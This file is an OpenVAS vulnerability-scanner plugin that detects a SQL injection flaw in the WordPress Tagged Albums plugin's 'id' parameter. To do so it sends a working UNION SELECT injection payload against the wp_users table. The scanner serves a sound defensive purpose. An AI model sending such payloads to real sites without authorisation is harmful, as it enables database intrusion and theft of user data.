###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_tagged_albums_plugin_sql_inj_vuln.nasl 13962 2019-03-01 14:14:42Z cfischer $
#
# WordPress Tagged Albums Plugin 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803051");
  script_version("$Revision: 13962 $");
  script_bugtraq_id(56569);
  script_tag(name:"last_modification", value:"$Date: 2017-04-24 11:02:24 +0200 (Mo, 24 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-11-19 11:18:38 +0530 (Mon, 19 Nov 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Tagged Albums Plugin 'id' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/80101");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118146/WordPress-Tagged-Albums-SQL-Injection.html");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to manipulate SQL
  queries by injecting arbitrary SQL code and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress Tagged Albums Plugin");

  script_tag(name:"insight", value:"Input passed via the 'id' parameter to
  /wp-content/plugins/taggedalbums/image.php is not properly sanitised before
  being used in a SQL query.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is installed with WordPress Tagged Albums Plugin and
  is prone to sql injection vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";
url = dir + '/wp-content/plugins/taggedalbums/image.php?id=-5/**/union/**/select/**/1,group_concat(0x73716C692D74657374,0x3a,@@version),3,4,5,6,7,8/**/from/**/wp_users--';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"sqli-test:[0-9]+.*:sqli-test", extra_check:">Gallery")){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);